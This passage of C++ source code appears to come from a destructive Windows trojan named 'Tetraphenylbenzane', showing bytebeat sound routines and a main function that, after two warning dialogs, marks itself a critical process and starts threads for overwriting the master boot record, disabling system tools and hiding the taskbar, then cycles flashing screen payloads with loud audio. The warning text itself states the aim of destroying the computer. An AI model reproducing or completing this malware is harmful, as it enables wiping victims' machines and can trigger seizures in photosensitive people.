        buffer[t] = static_cast<char>((t >> 1) * (t & 1638 ? 6 : 5) * (3 + (3 & t >> (t & 409 ? 7 : 14))) >> (3 & t >> 9) | t >> 4) + 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * (3 << (400 / (1 + (t % (16384 / (1 + (t / 2560)))))))) / (1 + (t / (1 + (1 / 10) + (sin(t / 40)))))) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t % (1 + (t >> (t & t >> 12)))) - 1;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(5235 * ((t >> 3) * t >> 13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t >> 9) * t >> 8;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t >> 12) * (t >> 4 | t >> 8)) + t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t / (1 + (t >> 2 ^ t >> 12))) * 1000000;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t / t + (t >> 9) % 8 + (t >> 12) % 4) * 10 * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t << (t & 4)) + (t << (t >> 6 & 17)) + (t << (t & 4))) / 8192) % (10 + t)) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI bytebeat15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 5) / (1 + (t >> 11))) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES) {
        if (MessageBoxW(NULL, L"WARNING!\n\nYou have encountered a Trojan horse called ''Tetraphenylbenzane'', which is very dangerous to run in your main environment. This program was designed to destroy your PC by overwriting your master boot sector, disabling essential programs like Task Manager and Registry Editor, and generating flashing phases and intense sounds.\n\nIf you don't know what this program is, if you suffer from photosensitive epilepsy, or if you are afraid of loud or disturbing sounds, click ''No'' to secure your computer. If you are running this program in a safe environment and you do not suffer from neurological problems, you can click ''Yes'' to initiate the complete destruction of your hardware.\n\nSo, do you want to continue running the malware or would you prefer to give up?", L"Tetraphenylbenzane-Safety.exe by UltraDasher965", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"THIS IS THE FINAL WARNING!\n\nIf you run it on your PC, then keep in mind that your data is saved or backed up.", L"?I??L ????I?? - Tetraphenylbenzane.exe", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    }

    ProcessIsCritical();
    CreateThread(0, 0, MBROverwriter, 0, 0, 0);
    CreateThread(0, 0, disabler, 0, 0, 0);
    CreateThread(0, 0, taskbarpoof, 0, 0, 0);

    Sleep(1000 * 5);

    if (MessageBoxW(NULL, L"Your computer has been Tetraphenylbenzane'd! Enjoy the hell casted onto your PC!", L"fakeerror.exe - System Error", MB_ICONERROR | MB_OK) != IDOK) return 1;

    Sleep(1000 * 5);

    CreateThread(0, 0, messagebox, 0, 0, 0);

    Sleep(1000);

    HANDLE thread1 = CreateThread(0, 0, payload1_1, 0, 0, 0);
    bytebeat1();
    Sleep(10000);
    HANDLE thread1dot1 = CreateThread(0, 0, payload1_2, 0, 0, 0);
    HANDLE thread1dot2 = CreateThread(0, 0, payload1_3, 0, 0, 0);
    HANDLE thread1dot3 = CreateThread(0, 0, payload1_4, 0, 0, 0);
    HANDLE thread1dot4 = CreateThread(0, 0, payload1_5, 0, 0, 0);
    HANDLE thread1dot5 = CreateThread(0, 0, payload1_6, 0, 0, 0);
    Sleep(10000);
    HANDLE thread1dot6 = CreateThread(0, 0, payload1_7, 0, 0, 0);
    Sleep(10000);
    TerminateThread(thread1, 0);
    CloseHandle(thread1);
    TerminateThread(thread1dot1, 0);
    CloseHandle(thread1dot1);
    TerminateThread(thread1dot2, 0);
    CloseHandle(thread1dot2);
    TerminateThread(thread1dot3, 0);
    CloseHandle(thread1dot3);
    TerminateThread(thread1dot4, 0);
    CloseHandle(thread1dot4);
    TerminateThread(thread1dot5, 0);
    CloseHandle(thread1dot5);
    TerminateThread(thread1dot6, 0);
    CloseHandle(thread1dot6);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
    bytebeat2();
    Sleep(30000);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
    bytebeat3();
    Sleep(30000);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread4 = CreateThread(0, 0, payload4_1, 0, 0, 0);
    HANDLE thread4dot1 = CreateThread(0, 0, payload4_2, 0, 0, 0);
    bytebeat4();
    Sleep(30000);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    TerminateThread(thread4dot1, 0);
    CloseHandle(thread4dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread5 = CreateThread(0, 0, payload5_1, 0, 0, 0);
    HANDLE thread5dot1 = CreateThread(0, 0, payload5_2, 0, 0, 0);
    bytebeat5();
    Sleep(30000);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    TerminateThread(thread5dot1, 0);
    CloseHandle(thread5dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
    HANDLE thread6dot1 = CreateThread(0, 0, hsl1, 0, 0, 0);
    bytebeat6();
    Sleep(30000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    TerminateThread(thread6dot1, 0);
    CloseHandle(thread6dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
    HANDLE sphere = CreateThread(0, 0, SphereThread, 0, 0, 0);
    bytebeat7();
    Sleep(30000);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
    HANDLE thread8dot1 = CreateThread(0, 0, rgbquad, 0, 0, 0);
    bytebeat8();
    Sleep(30000);
    TerminateThread(thread8, 0);
    CloseHandle(thread8);
    TerminateThread(thread8dot1, 0);
    CloseHandle(thread8dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
    HANDLE thread9dot1 = CreateThread(0, 0, hsl2, 0, 0, 0);
    bytebeat9();
    Sleep(30000);
    TerminateThread(thread9, 0);
    CloseHandle(thread9);
    TerminateThread(thread9dot1, 0);
    CloseHandle(thread9dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
    HANDLE thread10dot1 = CreateThread(0, 0, textouts, 0, 0, 0);
    bytebeat10();
    Sleep(30000);
    TerminateThread(thread10, 0);
    CloseHandle(thread10);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
    bytebeat11();
    Sleep(30000);
    TerminateThread(thread11, 0);
    CloseHandle(thread11);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
    HANDLE thread12dot1 = CreateThread(0, 0, circles, 0, 0, 0);
    bytebeat12();
    Sleep(30000);
    TerminateThread(thread12, 0);
    CloseHandle(thread12);
    TerminateThread(thread12dot1, 0);
    CloseHandle(thread12dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
    HANDLE thread13dot1 = CreateThread(0, 0, circles2, 0, 0, 0);
    bytebeat13();
    Sleep(30000);
    TerminateThread(thread13, 0);
    CloseHandle(thread13);
    TerminateThread(thread13dot1, 0);
    CloseHandle(thread13dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
    HANDLE thread14dot1 = CreateThread(0, 0, pidh, 0, 0, 0);
    bytebeat14();
    Sleep(30000);
    TerminateThread(thread14, 0);
    CloseHandle(thread14);
    TerminateThread(thread14dot1, 0);
    CloseHandle(thread14dot1);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

    HANDLE wordmess = CreateThread(0, 0, texts, 0, 0, 0);
    HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
    bytebeat15();
    Sleep(30000);
    TerminateThread(wordmess, 0);
    CloseHandle(wordmess);
    TerminateThread(thread15, 0);
    CloseHandle(thread15);
    RedrawWindow(0, 0, 0, 133);
    Sleep(100);

}